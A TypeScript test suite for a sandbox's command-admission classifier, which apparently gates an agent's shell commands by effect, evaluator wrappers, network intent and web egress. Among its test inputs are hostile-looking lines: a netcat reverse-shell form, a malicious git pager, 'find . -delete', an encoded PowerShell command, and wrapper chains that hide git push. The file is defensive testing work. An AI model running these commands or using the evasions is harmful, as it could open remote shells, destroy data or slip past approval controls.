import {
  sandboxCommandEffect,
  sandboxCommandHasGitSubcommand,
  sandboxCommandHasNetworkIntent,
  sandboxCommandIsOnlyRepositorySetup,
  sandboxCommandRequiresApproval,
  sandboxCommandUsesEvaluatorWrapper,
  sandboxCommandUsesUnstructuredOperation,
  sandboxCommandWebEgressRejection,
  sandboxInvocationPolicy,
  sandboxVerifyCommandMasksExitStatus,
  sandboxVerifyCommandUsesUnsafeSyntax,
} from '../../../src/core/sandbox/commandClassification';
import { sandboxCommandApprovalIdentity } from '../../../src/core/sandbox/Sandbox';

describe('sandbox command admission', () => {
  it.each([
    ['pwd', 'inspect'],
    ['cd /tmp/repo && git status --short', 'inspect'],
    ["rg -n 'deleteSession' packages/trueforge-ui/src", 'inspect'],
    ['find packages -type f -name "*.tsx"', 'inspect'],
    ['pnpm test', 'execute'],
    ['pnpm build', 'execute'],
    ['npx tsc --noEmit -p tsconfig.json', 'execute'],
    ["sed -i 's/a/b/' file.ts", 'edit'],
    ['git switch -c aman/delete-chat', 'edit'],
    ['git -C /opt/tf/repo checkout -b aman/delete-chat', 'edit'],
    ['git commit -m "Add delete chat"', 'commit'],
    ['PATH=/tmp/pnpm-runtime:$PATH git commit -m "Add delete chat"', 'commit'],
    ['env PATH=/tmp/pnpm-runtime:$PATH git commit -m "Add delete chat"', 'commit'],
    ['env X=1 rm tracked.txt', 'edit'],
    ['X=1 rm tracked.txt', 'edit'],
    ['env - git commit -m "Ignore inherited environment"', 'commit'],
    ['env --un OLD_TOKEN git commit -m "Unset token"', 'commit'],
    ['env --ch /tmp git push origin HEAD', 'push'],
    ['env -a trueforge-git git commit -m "Override argv zero"', 'commit'],
    ['env --argv0=trueforge-git git push origin HEAD', 'push'],
    ['env \'A-B=1\' git commit -m "Non-shell assignment"', 'commit'],
    ['env env git commit -m "Nested environment"', 'commit'],
    ['env -S "git push origin HEAD"', 'push'],
    ['xargs git push origin HEAD', 'push'],
    ['xargs --eof git push origin HEAD', 'push'],
    ['xargs --max-args 1 git push origin HEAD', 'push'],
    ['find . -exec git commit -m nested {} \\;', 'commit'],
    ['timeout 30 git push origin HEAD', 'push'],
    ['nice -n 10 rm tracked.txt', 'edit'],
    ['nohup git commit -m hidden', 'commit'],
    ['setsid env git push origin HEAD', 'push'],
    ['git push origin HEAD', 'push'],
    ['git push origin HEAD 2>&1', 'push'],
  ] as const)('classifies syntax safety for %s as %s', (command, effect) => {
    expect(sandboxCommandEffect(command)).toBe(effect);
  });

  it.each([
    ['commit', 'env - git commit -m "Ignore inherited environment"'],
    ['push', 'env --un OLD_TOKEN env --ch /tmp git push origin HEAD'],
    ['commit', 'env -a trueforge-git env -S "git commit -m nested"'],
    ['commit', "env 'A-B=1' git commit -m assignment"],
    ['push', 'xargs -n 1 git push origin HEAD'],
    ['commit', 'find . -exec git commit -m nested {} \\;'],
    ['push', 'timeout --signal=KILL 5 -- git push origin HEAD'],
    ['commit', 'xargs nice -n 5 git commit -m nested'],
  ] as const)('finds Git %s through GNU env wrappers in %s', (subcommand, command) => {
    expect(sandboxCommandHasGitSubcommand(command, subcommand)).toBe(true);
  });

  it('fails closed when Git is hidden beyond the env wrapper depth limit', () => {
    const command = 'env env env env env git commit -m hidden';
    expect(sandboxCommandEffect(command)).toBe('execute');
    expect(sandboxCommandHasGitSubcommand(command, 'commit')).toBe(false);
  });

  it.each([
    'pnpm verify',
    'make check',
    'cargo test',
    'gradle check',
    './scripts/validate.sh',
    'python tools/check.py',
  ])('accepts arbitrary explicit verification command: %s', command => {
    expect(sandboxInvocationPolicy({ command, purpose: 'verify' })).toEqual({
      effect: 'verify',
      rejection: undefined,
    });
  });

  it.each([
    ['rm tracked.txt && ./scripts/validate.sh', 'edit'],
    ['env X=1 rm tracked.txt', 'edit'],
    ['X=1 rm tracked.txt', 'edit'],
    ['git commit -m fix && make check', 'commit'],
    ['make check && git push origin HEAD', 'push'],
    ['find . -delete', 'edit'],
    ['find . -exec rm {} \\;', 'edit'],
    ['timeout 5 rm tracked.txt', 'edit'],
  ] as const)('rejects %s as verification because it contains %s', (command, prohibitedEffect) => {
    expect(sandboxInvocationPolicy({ command, purpose: 'verify' })).toEqual({
      effect: 'verify',
      rejection: `A verification invocation cannot contain a command classified as ${prohibitedEffect}.`,
    });
  });

  it.each([
    'find . -delete',
    'find . -exec rm {} ;',
    "git -c core.pager='sh -c evil' log",
    'git diff --output=changes.patch',
    'rg --pre "rm -f target" pattern .',
    'python -c "print(1)"',
    'cat package.json > copy.json',
    'cat package.json | tee copy.json',
    'echo $(touch changed)',
  ])('keeps ambiguous or writable command gated: %s', command => {
    expect(sandboxCommandRequiresApproval(sandboxCommandEffect(command))).toBe(true);
  });

  it.each([
    `python -c "print(1)"`,
    `python3 -c "open('out.dat', 'r').read()"`,
    `python3.12 -c "open('out.dat', '\\x77').close()"`,
    `python -cprint(1)`,
    `python -c"print('-c')"`,
    `python -c "mode = 'wb'; open('out.bin', mode).write(b'x')"`,
    `python -c "open('out.bin', 'wb').write(b'x')"`,
    `py.exe -c "getattr(__import__('builtins'), 'open')('out.dat', 'w').close()"`,
    `env CI=true python -c "print(1)"`,
    `env -i python -c "print(1)"`,
    `env -uFOO python -c "print(1)"`,
    `env --unset=FOO python -c "print(1)"`,
    `env - python -c "print(1)"`,
    `env --un FOO python -c "print(1)"`,
    `env --un=FOO python -c "print(1)"`,
    `env --ch /tmp python -c "print(1)"`,
    `env --ch=/tmp python -c "print(1)"`,
    `env -C/tmp python -c "print(1)"`,
    `env -a python-zero python -c "print(1)"`,
    `env -apython-zero python -c "print(1)"`,
    `env --argv0=python-zero python -c "print(1)"`,
    `env --ar=python-zero python -c "print(1)"`,
    `env 'A-B=1' python -c "print(1)"`,
    `env env env python -c "print(1)"`,
    `CI=true python3 -c "print(1)"`,
    `python -c"open('out.dat', 'w').close()"`,
    `env --s "python -c 'print(1)'"`,
    `env --sp "python -c 'print(1)'"`,
    `env --spl "python -c 'print(1)'"`,
    `env -S "python -c 'open(\\"out.dat\\", \\"w\\").close()'"`,
    `env -S"python -c 'print(1)'"`,
    `env -iS"python -c 'print(1)'"`,
    `env -iS "python -c 'open(\\"out.dat\\", \\"w\\").close()'"`,
    `env --split-string="python -c 'open(\\"out.dat\\", \\"w\\").close()'"`,
    `env --split-s="python -c 'open(\\"out.dat\\", \\"w\\").close()'"`,
    `env --s="python -c 'print(1)'"`,
    `env -S "env --split-string 'python -c \\\"print(1)\\\"'"`,
    `env --split-string="env -S 'python -c \\\"print(1)\\\"'"`,
    `env -S "tee output.txt"`,
    "env -S 'python ${PYTHON_ARGS}'",
    "env -S 'python # ignored'",
    "env -S 'python \\cignored'",
    `env --i python tools/check.py`,
    `env env env env env python tools/check.py`,
    `xargs python -c "print(1)"`,
    `xargs -n 1 python -c "print(1)"`,
    `xargs env CI=true python -c "print(1)"`,
    `xargs env -uFOO python -c "print(1)"`,
    `find . -exec python3 -c "print(1)" ;`,
    `find . -exec env python3 -c "print(1)" {} +`,
    `find . -exec env -i xargs python -c "print(1)" {} +`,
    "printf 'print(1)' | python -",
    "printf 'print(1)' | python",
    `env -S "python -"`,
  ])('treats Python source evaluation as an unstructured command: %s', command => {
    expect(sandboxCommandUsesUnstructuredOperation(command)).toBe(true);
  });

  it.each([
    'cat $(touch out)',
    'cat `touch out`',
    'printf "%s" "$(git push origin HEAD)"',
    'printf "%s" "`touch out`"',
  ])('treats executable command substitution as unstructured: %s', command => {
    expect(sandboxCommandUsesUnstructuredOperation(command)).toBe(true);
  });

  it('keeps a single-quoted command substitution literal', () => {
    expect(sandboxCommandUsesUnstructuredOperation("echo '$(touch out)'")).toBe(false);
  });

  it.each([
    'python tools/check.py',
    'python3 -m pytest',
    'py.exe script.py',
    'python script.py -c',
    'python -m module -c',
    'python -- script.py -c',
    'xargs env -uFOO python script.py -c',
    'find . -exec env -uFOO python script.py -c {} +',
    `env -S "echo python -c example"`,
    `env --s "xargs echo python -c example"`,
    `env -S "python script.py -c"`,
    `env -S "env -uFOO python script.py -c"`,
    'env -uS python tools/check.py',
    'env -u S python tools/check.py',
    'env - python tools/check.py',
    'env --un S python tools/check.py',
    'env --ch /tmp python tools/check.py',
    'env -a python-zero python tools/check.py',
    'env -apython-zero python tools/check.py',
    'env --argv0 python-zero python tools/check.py',
    'env env env env python tools/check.py',
    `env -S "echo > out"`,
    `env --split-string="cat input.txt > output.txt"`,
    `env -S "echo A# B"`,
    `env -S "echo '# literal'"`,
    'python --version',
    'python -V',
    'python -VV',
    'python --help',
    "printf 'print(1)' | python --version",
    `A-B=1 python -c "print(1)"`,
  ])('does not reject structured Python commands: %s', command => {
    expect(sandboxCommandUsesUnstructuredOperation(command)).toBe(false);
  });

  it.each([
    'node --version 2>&1',
    'node --version 2>&1;',
    'node --version 2>&1; pnpm --version 2>&1',
    'pnpm install --frozen-lockfile 2>&1 | tail -20',
    'pnpm --version 2>&1 && pnpm install --frozen-lockfile 2>&1',
    'echo hi >&2',
    'echo hi >&2;',
    'echo hi 2>&-',
    'echo hi >&-',
    'echo hi 2>/dev/null',
  ])('treats file descriptor duplication as structured, including before other punctuation: %s', command => {
    expect(sandboxCommandUsesUnstructuredOperation(command)).toBe(false);
  });

  it.each([
    'echo hi > out.txt',
    'echo hi >> log',
    'echo hi &> file',
    'echo hi >& file',
    // `&>word` always redirects to a file, even when `word` is numeric or
    // `-`; it is never descriptor duplication.
    'echo hi &>1',
    'echo hi &>-',
    'echo hi >&file',
    'echo hi 2>&file',
    // A leading digit run that is not the *entire* operand is a filename,
    // not a descriptor number -- the whole word must be digits or `-`.
    'echo hi >&1file',
    'echo hi 2>&12abc',
    'echo hi >&1:log',
    'cat <<EOF\nhi\nEOF',
    'pnpm anything | tee test.log',
  ])('keeps real redirection, heredocs, and tee refused: %s', command => {
    expect(sandboxCommandUsesUnstructuredOperation(command)).toBe(true);
  });

  it.each([
    `env -S "bash -c 'echo unsafe'"`,
    `env --split-string="sudo echo unsafe"`,
    `env env bash -c whoami`,
    `xargs sh -c "git push origin HEAD"`,
    `xargs sh -c'git push origin HEAD'`,
    `xargs --max-a 1 git push origin HEAD`,
    `find . -exec bash -c "git commit -m nested" {} \\;`,
    `find . -exec bash -c'git commit -m nested' {} \\;`,
    `pwsh -NoProfile -Command "git push origin HEAD"`,
    `powershell -EncodedCommand ZQBjAGgAbwAgAHgA`,
    `timeout 30 sh -c 'git commit -m hidden && git push origin HEAD'`,
    `nice -n 10 bash -c 'git commit -m hidden'`,
    `nohup sh -c 'git push origin HEAD'`,
    `setsid sh -c 'git commit -m hidden'`,
    `time sh -c 'git push origin HEAD'`,
    `xargs timeout 5 sh -c 'git push origin HEAD'`,
    `/usr/bin/timeout --signal=KILL 5 -- sh -c 'git push origin HEAD'`,
  ])('rejects direct and recursively nested evaluator wrappers: %s', command => {
    expect(sandboxCommandUsesEvaluatorWrapper(command)).toBe(true);
  });

  it('fails closed when indirect command nesting exceeds the traversal limit', () => {
    expect(sandboxCommandUsesEvaluatorWrapper('xargs xargs xargs xargs xargs git push origin HEAD')).toBe(true);
  });

  it('fails closed when environment wrapper nesting exceeds the traversal limit', () => {
    expect(sandboxCommandUsesEvaluatorWrapper("env env env env env sh -c 'touch out'")).toBe(true);
  });

  it('finds separately reviewable commit and push operations through xargs', () => {
    const command = 'printf x | xargs git commit -m nested && printf x | xargs git push origin HEAD';
    expect(sandboxCommandHasGitSubcommand(command, 'commit')).toBe(true);
    expect(sandboxCommandHasGitSubcommand(command, 'push')).toBe(true);
  });

  it('does not treat evaluator-looking split-string arguments as command wrappers', () => {
    expect(sandboxCommandUsesEvaluatorWrapper(`env -S "echo sh -c unsafe"`)).toBe(false);
  });

  it('does not report ordinary redirection as an evaluator wrapper', () => {
    expect(sandboxCommandUsesEvaluatorWrapper('cat file > out')).toBe(false);
  });

  it.each([
    'echo python -c example',
    'printf "%s %s" python -c',
    'rg python -c README.md',
    'node tool.js /usr/bin/python3 -c example',
    'xargs echo python -c example',
    'echo env -S python -c example',
  ])('does not treat Python-looking command arguments as interpreter invocations: %s', command => {
    expect(sandboxCommandUsesUnstructuredOperation(command)).toBe(false);
  });

  it('keeps read-only pipelines inspect-only when stderr is discarded', () => {
    expect(sandboxCommandEffect('find . -name "*.ts" | xargs grep -l "AgentChatServer" 2>/dev/null | head -10')).toBe(
      'inspect',
    );
  });

  it.each(['12>&1', '123>/dev/null', '123>>/dev/null'])('handles grouped numeric redirection fds: %s', redirect => {
    expect(sandboxCommandEffect(`find . -name "*.ts" ${redirect}`)).toBe('inspect');
  });

  it('keeps environment-prefixed inspections and unknown commands approval-gated', () => {
    expect(sandboxCommandEffect('PAGER=/tmp/custom git log -1')).toBe('execute');
    expect(sandboxCommandEffect('PATH=/tmp/tools:$PATH pnpm test')).toBe('execute');
  });

  it('auto-admits only inspect effects', () => {
    expect(sandboxCommandRequiresApproval('inspect')).toBe(false);
    for (const effect of ['edit', 'verify', 'commit', 'push', 'execute'] as const) {
      expect(sandboxCommandRequiresApproval(effect)).toBe(true);
    }
  });

  it('separates approved repository setup from source-edit progress', () => {
    expect(
      sandboxCommandIsOnlyRepositorySetup(
        'cd /home/nightona && git clone https://github.com/example/project.git && git switch -c feature/test',
      ),
    ).toBe(true);
    expect(
      sandboxCommandIsOnlyRepositorySetup(
        "git clone https://github.com/example/project.git && sed -i 's/old/new/' project/src/app.ts",
      ),
    ).toBe(false);
  });

  it('scopes every command identity exactly', () => {
    const identity = (input: {
      purpose: 'verify' | 'execute';
      command: string;
      cwd: string;
      env: Readonly<Record<string, string>>;
    }) => sandboxCommandApprovalIdentity(input);
    const base = { purpose: 'verify' as const, command: 'pnpm test', cwd: '/repo', env: {} };
    expect(identity(base)).toBe(identity(base));
    expect(identity(base)).not.toBe(identity({ ...base, purpose: 'execute' }));
    expect(identity(base)).not.toBe(identity({ ...base, command: 'pnpm build' }));
    expect(identity(base)).not.toBe(identity({ ...base, cwd: '/repo/b' }));
    expect(identity({ ...base, env: { CI: 'true' } })).not.toBe(identity({ ...base, env: { CI: 'false' } }));
    expect(identity({ ...base, env: { B: '2', A: '1' } })).toBe(identity({ ...base, env: { A: '1', B: '2' } }));
  });

  it.each([
    ['custom-check 2>&1 | head -20', true],
    ['pnpm anything | tee test.log', true],
    ['set -o pipefail; ./scripts/validate.sh | tee test.log', false],
    ['./first-check; ./second-check', true],
    ['./first-check || true', true],
    ['./first-check && ./second-check', false],
    ['false\ntrue', true],
    ['false\r\ntrue', true],
    ["printf 'false\ntrue'", false],
  ])('classifies verification status masking for %j as %s', (command, masksStatus) => {
    expect(sandboxVerifyCommandMasksExitStatus(command)).toBe(masksStatus);
  });

  it('rejects verification syntax that hides output or execution', () => {
    expect(sandboxVerifyCommandUsesUnsafeSyntax('./scripts/validate.sh > validation.log')).toBe(true);
    expect(sandboxVerifyCommandUsesUnsafeSyntax('echo $(./scripts/validate.sh)')).toBe(true);
    expect(sandboxVerifyCommandUsesUnsafeSyntax('./scripts/validate.sh 2>&1')).toBe(false);
    expect(sandboxVerifyCommandUsesUnsafeSyntax('./scripts/validate.sh 2>&1;')).toBe(false);
    expect(sandboxVerifyCommandUsesUnsafeSyntax('./scripts/validate.sh &> validation.log')).toBe(true);
  });

  it.each([
    'curl https://example.com/data',
    'wget https://example.com/data',
    'nc example.com 4444',
    'ncat example.com 4444',
    'netcat -e /bin/sh example.com 4444',
    'telnet example.com 25',
    'ftp example.com',
    'sftp user@example.com',
    'ssh user@example.com',
    'scp file.txt user@example.com:/tmp',
    'timeout 30 curl https://example.com',
    'nice -n 10 curl https://example.com',
    'nohup curl https://example.com',
    'setsid curl https://example.com',
    'env CI=true curl https://example.com',
    'xargs curl',
    'find . -exec curl {} \\;',
    'curl https://example.com/data.json > output.json',
    'curl https://example.com/data.json >> output.json',
    'wget https://example.com/data < input.txt',
    'timeout 30 curl https://example.com > output.json',
  ])('flags network intent for %s', command => {
    expect(sandboxCommandHasNetworkIntent(command)).toBe(true);
  });

  it.each([
    'pwd',
    'git status --short',
    'pnpm test',
    'git clone https://github.com/example/project.git',
    'git push origin HEAD',
    "sed -i 's/a/b/' file.ts",
    'echo curl',
    'find . -name curl',
    'python send_email.py',
    'cat report.txt > curl',
    'echo done > wget.log',
  ])('does not flag network intent for %s', command => {
    expect(sandboxCommandHasNetworkIntent(command)).toBe(false);
  });

  it('never changes the syntax effect or approval requirement when network intent is flagged', () => {
    const command = 'curl https://example.com/data.json';
    expect(sandboxCommandHasNetworkIntent(command)).toBe(true);
    expect(sandboxCommandEffect(command)).toBe('execute');
    expect(sandboxCommandRequiresApproval(sandboxCommandEffect(command))).toBe(true);
  });

  describe('sandboxCommandWebEgressRejection', () => {
    const webConnectorToolHint = "the web connector's fetch tool";

    it('refuses a curl to a public host when a web connector is configured', () => {
      const rejection = sandboxCommandWebEgressRejection({
        command: 'curl https://example.com/data',
        webConnectorAttached: true,
        webConnectorToolHint,
      });
      expect(rejection).toBeDefined();
      expect(rejection).toContain('curl');
      expect(rejection).toContain(webConnectorToolHint);
    });

    it('refuses wget the same way', () => {
      const rejection = sandboxCommandWebEgressRejection({
        command: 'wget https://example.com/data',
        webConnectorAttached: true,
        webConnectorToolHint,
      });
      expect(rejection).toBeDefined();
      expect(rejection).toContain('wget');
    });

    it('allows the same command when no web connector is configured', () => {
      expect(
        sandboxCommandWebEgressRejection({
          command: 'curl https://example.com/data',
          webConnectorAttached: false,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
    });

    it('exempts loopback hosts even when a web connector is configured', () => {
      expect(
        sandboxCommandWebEgressRejection({
          command: 'curl http://localhost:8080/status',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
      expect(
        sandboxCommandWebEgressRejection({
          command: 'curl http://127.0.0.1:8080/status',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
    });

    it('leaves git fetch to the bound repository host unaffected', () => {
      expect(
        sandboxCommandWebEgressRejection({
          command: 'git fetch origin main',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
      expect(
        sandboxCommandWebEgressRejection({
          command: 'git clone https://github.com/example/project.git',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
    });

    it('leaves non-network commands unaffected', () => {
      expect(
        sandboxCommandWebEgressRejection({
          command: 'pwd',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
    });

    it('refuses when a local first URL is followed by an external one', () => {
      const rejection = sandboxCommandWebEgressRejection({
        command: 'curl http://localhost http://example.com',
        webConnectorAttached: true,
        webConnectorToolHint,
      });
      expect(rejection).toBeDefined();
      expect(rejection).toContain('curl');
    });

    it('does not misread a value-taking option argument as an external host', () => {
      expect(
        sandboxCommandWebEgressRejection({
          command: 'ssh -p 22 localhost',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
      expect(
        sandboxCommandWebEgressRejection({
          command: 'curl --connect-timeout 5 http://localhost',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
    });

    it('still refuses when a value-taking option is followed by a genuinely external host', () => {
      const rejection = sandboxCommandWebEgressRejection({
        command: 'curl --connect-timeout 5 https://example.com',
        webConnectorAttached: true,
        webConnectorToolHint,
      });
      expect(rejection).toBeDefined();
      expect(rejection).toContain('curl');
    });

    it('detects external proxy destinations in curl -x option', () => {
      const rejection = sandboxCommandWebEgressRejection({
        command: 'curl -x http://proxy.example:3128 http://localhost',
        webConnectorAttached: true,
        webConnectorToolHint,
      });
      expect(rejection).toBeDefined();
      expect(rejection).toContain('curl');
    });

    it('detects external proxy destinations in curl --proxy option', () => {
      const rejection = sandboxCommandWebEgressRejection({
        command: 'curl --proxy=http://proxy.example http://localhost',
        webConnectorAttached: true,
        webConnectorToolHint,
      });
      expect(rejection).toBeDefined();
      expect(rejection).toContain('curl');
    });

    it('allows curl with loopback proxy destination', () => {
      expect(
        sandboxCommandWebEgressRejection({
          command: 'curl -x http://localhost:3128 http://localhost',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
    });

    it('detects external jump hosts in ssh -J option', () => {
      const rejection = sandboxCommandWebEgressRejection({
        command: 'ssh -J jump.example localhost',
        webConnectorAttached: true,
        webConnectorToolHint,
      });
      expect(rejection).toBeDefined();
      expect(rejection).toContain('ssh');
    });

    it('allows ssh with loopback jump host', () => {
      expect(
        sandboxCommandWebEgressRejection({
          command: 'ssh -J localhost localhost',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
    });

    it('allows ssh to loopback with remote command arguments', () => {
      expect(
        sandboxCommandWebEgressRejection({
          command: 'ssh localhost echo hello',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
    });

    it('allows scp with loopback destination and local paths', () => {
      expect(
        sandboxCommandWebEgressRejection({
          command: 'scp file.txt localhost:/tmp/',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
    });

    it('detects external jump host in scp -J option', () => {
      const rejection = sandboxCommandWebEgressRejection({
        command: 'scp -J jump.example file.txt localhost:/tmp/',
        webConnectorAttached: true,
        webConnectorToolHint,
      });
      expect(rejection).toBeDefined();
      expect(rejection).toContain('scp');
    });

    it('allows sftp with plain loopback hostname', () => {
      expect(
        sandboxCommandWebEgressRejection({
          command: 'sftp localhost',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
    });

    it('allows sftp with loopback ip address', () => {
      expect(
        sandboxCommandWebEgressRejection({
          command: 'sftp 127.0.0.1',
          webConnectorAttached: true,
          webConnectorToolHint,
        }),
      ).toBeUndefined();
    });
  });
});
